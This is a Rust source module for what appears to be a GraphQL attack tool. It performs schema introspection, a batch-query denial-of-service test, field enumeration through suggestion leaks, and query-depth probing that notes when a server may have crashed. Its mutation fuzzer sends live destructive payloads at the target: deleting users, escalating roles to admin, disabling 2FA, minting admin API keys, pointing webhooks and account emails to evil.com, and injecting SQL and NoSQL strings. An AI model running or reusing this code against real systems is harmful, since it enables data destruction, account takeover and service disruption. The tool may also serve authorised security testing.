use colored::Colorize;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

#[derive(Debug, Serialize, Deserialize)]
struct GraphQLResponse {
    data: Option<serde_json::Value>,
    errors: Option<Vec<serde_json::Value>>,
}

pub async fn introspect(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} GraphQL Introspection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let query = r#"{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name description type { name kind ofType { name kind } } args { name description type { name kind ofType { name kind } } } } inputFields { name description type { name kind ofType { name kind } } } enums { name description } interfaces { name } } directives { name description locations args { name description type { name kind ofType { name kind } } } } } }"}"#;

    let resp = client
        .post(url)
        .header("Content-Type", "application/json")
        .body(query.to_string())
        .send()
        .await?;
    let status = resp.status();
    let body = resp.text().await.unwrap_or_default();

    println!("{} Status: {}", "[*]".cyan().bold(), status);

    if body.contains("__schema") {
        println!("{} [HIGH] Introspection enabled!", "[!]".red().bold());
        let parsed: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
        if let Some(types) = parsed["data"]["__schema"]["types"].as_array() {
            println!("{} Found {} types:", "[*]".cyan().bold(), types.len());
            for t in types.iter().take(30) {
                let name = t["name"].as_str().unwrap_or("?");
                let kind = t["kind"].as_str().unwrap_or("?");
                if !name.starts_with("__") {
                    println!("  {} {} ({})", "*".cyan(), name.yellow(), kind);
                    if let Some(fields) = t["fields"].as_array() {
                        for f in fields.iter().take(5) {
                            let fname = f["name"].as_str().unwrap_or("?");
                            println!("    {} {}", ">".dimmed(), fname);
                        }
                    }
                }
            }
        }
    } else if body.contains("errors") {
        println!(
            "{} Introspection disabled or errors returned.",
            "[-]".yellow().bold()
        );
        println!(
            "  {} {}",
            "*".cyan(),
            body.chars().take(300).collect::<String>()
        );
    } else {
        println!("{} Unexpected response.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn batch(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    count: usize,
) -> anyhow::Result<()> {
    println!("{} GraphQL Batch Query DoS", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} Batch size: {}", "[*]".cyan().bold(), count);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let single_query = r#"{"query":"{ __typename }"}"#;
    let batch: Vec<&str> = vec![single_query; count];
    let batch_json = format!("[{}]", batch.join(","));

    println!(
        "{} Sending batch of {} queries...",
        "[*]".cyan().bold(),
        count
    );
    let start = std::time::Instant::now();
    let resp = client
        .post(url)
        .header("Content-Type", "application/json")
        .body(batch_json)
        .send()
        .await?;
    let elapsed = start.elapsed();
    let status = resp.status();
    let body = resp.text().await.unwrap_or_default();

    println!("{} Status: {}", "[*]".cyan().bold(), status);
    println!(
        "{} Time: {:.2}s",
        "[*]".cyan().bold(),
        elapsed.as_secs_f64()
    );
    println!(
        "{} Response length: {} bytes",
        "[*]".cyan().bold(),
        body.len()
    );

    if elapsed.as_secs() > 5 {
        println!(
            "{} [HIGH] Server vulnerable to batch query DoS — {}s response time",
            "[!]".red().bold(),
            elapsed.as_secs()
        );
    } else {
        println!("{} No significant delay detected.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn suggest(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    wordlist: Option<&str>,
) -> anyhow::Result<()> {
    println!("{} GraphQL Field Suggestion Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let fields: Vec<String> = if let Some(wl) = wordlist {
        std::fs::read_to_string(wl)?
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect()
    } else {
        vec![
            "user",
            "users",
            "admin",
            "id",
            "email",
            "name",
            "password",
            "token",
            "session",
            "account",
            "post",
            "posts",
            "comment",
            "comments",
            "product",
            "products",
            "order",
            "orders",
            "payment",
            "payments",
            "file",
            "files",
            "upload",
            "config",
            "settings",
            "debug",
            "query",
            "mutation",
            "subscription",
            "node",
            "nodes",
            "edges",
            "createdAt",
            "updatedAt",
            "deletedAt",
            "role",
            "permissions",
            "apiKey",
            "secret",
            "key",
            "hash",
            "salt",
            "otp",
            "mfa",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    };

    let mut found = Vec::new();

    for field in &fields {
        let query = format!(r#"{{"query":"{{ {} }}"}}"#, field);
        let resp = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(query)
            .send()
            .await;
        if let Ok(r) = resp {
            let body = r.text().await.unwrap_or_default();
            if (body.contains("Did you mean") || body.contains("did you mean"))
                && let Some(start_idx) = body.find("did you mean")
            {
                let snippet = &body[start_idx..body.len().min(start_idx + 100)];
                found.push((field.clone(), snippet.to_string()));
                println!(
                    "{} [+] Field suggestion for '{}': {}",
                    "[+]".green().bold(),
                    field.yellow(),
                    snippet
                );
            }
        }
    }

    if found.is_empty() {
        println!("{} No field suggestions leaked.", "[-]".yellow().bold());
    } else {
        println!(
            "\n{} {} field(s) leaked via suggestions",
            "[*]".cyan().bold(),
            found.len()
        );
    }
    Ok(())
}

pub async fn depth(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    max_depth: usize,
) -> anyhow::Result<()> {
    println!("{} GraphQL Query Depth Limit Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} Max depth: {}", "[*]".cyan().bold(), max_depth);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    for depth in 1..=max_depth {
        let mut query = String::from("{ user { id");
        for _ in 0..depth {
            query.push_str(" user { id");
        }
        for _ in 0..depth {
            query.push_str(" }");
        }
        query.push_str(" } }");

        let payload = format!(r#"{{"query":"{}"}}"#, query.replace("\"", "\\\""));
        let start = std::time::Instant::now();
        let resp = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload)
            .send()
            .await;
        let elapsed = start.elapsed();

        match resp {
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                let has_error =
                    body.contains("depth") || body.contains("too deep") || body.contains("maximum");
                let status_str = if has_error {
                    "BLOCKED".green().to_string()
                } else if elapsed.as_secs() > 3 {
                    "SLOW".red().bold().to_string()
                } else {
                    "ok".to_string()
                };
                println!(
                    "  {} depth={:3} status={} time={:.2}s {}",
                    "*".cyan(),
                    depth,
                    status,
                    elapsed.as_secs_f64(),
                    status_str
                );

                if has_error {
                    println!(
                        "{} Depth limit found at depth {}",
                        "[+]".green().bold(),
                        depth
                    );
                    break;
                }
            }
            Err(_) => {
                println!("  {} depth={:3} ERROR (timeout/refused)", "*".cyan(), depth);
                println!(
                    "{} Server may have crashed or rate-limited at depth {}",
                    "[!]".red().bold(),
                    depth
                );
                break;
            }
        }
    }

    println!("\n{} Depth limit test complete.", "[*]".cyan().bold());
    Ok(())
}

const MUTATION_FUZZ_PAYLOADS: &[(&str, &str)] = &[
    ("IDOR — update by ID", r#"{"query":"mutation { updateUser(id: 1, input: {email: \"x@evil.com\"}) { id email } }"}"#),
    ("IDOR — delete by ID", r#"{"query":"mutation { deleteUser(id: 1) { success } }"}"#),
    ("Mass assignment — role", r#"{"query":"mutation { updateUser(input: {role: \"admin\"}) { id role } }"}"#),
    ("Mass assignment — isAdmin", r#"{"query":"mutation { updateUser(input: {isAdmin: true}) { id } }"}"#),
    ("Mass assignment — verified", r#"{"query":"mutation { updateUser(input: {verified: true}) { id } }"}"#),
    ("Unauthorized create", r#"{"query":"mutation { createUser(input: {email: \"test@evil.com\", password: \"x\"}) { id } }"}"#),
    ("Unauthorized admin create", r#"{"query":"mutation { createAdmin(input: {email: \"admin@evil.com\"}) { id role } }"}"#),
    ("Batch update", r#"{"query":"mutation { updateUsers(ids: [1,2,3], input: {status: \"deleted\"}) { count } }"}"#),
    ("Batch delete", r#"{"query":"mutation { deleteUsers(ids: [1,2,3,4,5]) { count } }"}"#),
    ("Permission escalation", r#"{"query":"mutation { updatePermissions(userId: 1, permissions: [\"admin\",\"superuser\"]) { success } }"}"#),
    ("Password reset abuse", r#"{"query":"mutation { resetPassword(email: \"victim@target.com\") { success } }"}"#),
    ("Email change no verify", r#"{"query":"mutation { updateEmail(userId: 1, email: \"attacker@evil.com\") { id } }"}"#),
    ("2FA disable", r#"{"query":"mutation { disable2FA(userId: 1) { success } }"}"#),
    ("API key generation", r#"{"query":"mutation { generateApiKey(scope: \"admin\") { key } }"}"#),
    ("Token grant", r#"{"query":"mutation { grantToken(userId: 1, scope: \"*\") { token } }"}"#),
    ("Webhook override", r#"{"query":"mutation { updateWebhook(url: \"https://evil.com/hook\") { id } }"}"#),
    ("Config injection", r#"{"query":"mutation { updateConfig(key: \"admin_email\", value: \"attacker@evil.com\") { success } }"}"#),
    ("SQLi in mutation arg", r#"{"query":"mutation { updateUser(id: \"1' OR '1'='1\", input: {role: \"admin\"}) { id } }"}"#),
    ("NoSQLi in mutation arg", r#"{"query":"mutation { updateUser(id: {\"$ne\": null}, input: {role: \"admin\"}) { id } }"}"#),
    ("Introspection in mutation", r#"{"query":"mutation { __schema { types { name } } }"}"#),
];

pub async fn fuzz(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} GraphQL Mutation Fuzzing", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} {} mutation payloads", "[*]".cyan().bold(), MUTATION_FUZZ_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut results = Vec::new();

    for (name, payload) in MUTATION_FUZZ_PAYLOADS {
        match client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_data = body.contains("\"data\"") && !body.contains("null");
                let has_errors = body.contains("\"errors\"");
                let has_auth_error = body.contains("Unauthorized")
                    || body.contains("Forbidden")
                    || body.contains("Not authenticated")
                    || body.contains("not authorized");
                let has_success = body.contains("\"success\":true") || body.contains("\"id\"");
                let has_sensitive = body.contains("token") || body.contains("key") || body.contains("password") || body.contains("secret");

                let tag = if has_data && has_success && !has_auth_error {
                    "EXPLOITED".red().bold().to_string()
                } else if has_data && !has_auth_error {
                    "data".yellow().to_string()
                } else if has_auth_error {
                    "blocked".green().to_string()
                } else if has_errors {
                    "error".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:35} status={} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    status,
                    tag
                );

                if has_data && !has_auth_error {
                    println!("    {} {}", ">".red().bold(), body.chars().take(300).collect::<String>());
                    results.push((name, has_sensitive, has_success));
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:35} error", "*".red(), results.len() + 1, name);
            }
        }
    }

    let exploited = results.iter().filter(|(_, _, s)| *s).count();
    let data_only = results.iter().filter(|(_, _, s)| !*s).count();
    let sensitive_count = results.iter().filter(|(_, s, _)| *s).count();

    println!(
        "\n{} {} / {} mutations succeeded, {} returned data, {} leaked sensitive fields",
        "[*]".cyan().bold(),
        exploited,
        MUTATION_FUZZ_PAYLOADS.len(),
        data_only,
        sensitive_count
    );

    if exploited > 0 {
        println!("{} [CRITICAL] Unauthorized mutations executed — IDOR/mass assignment confirmed!", "[!]".red().bold());
    }
    if sensitive_count > 0 {
        println!("{} [HIGH] Sensitive data in mutation responses — credential/token exposure!", "[!]".red().bold());
    }

    Ok(())
}
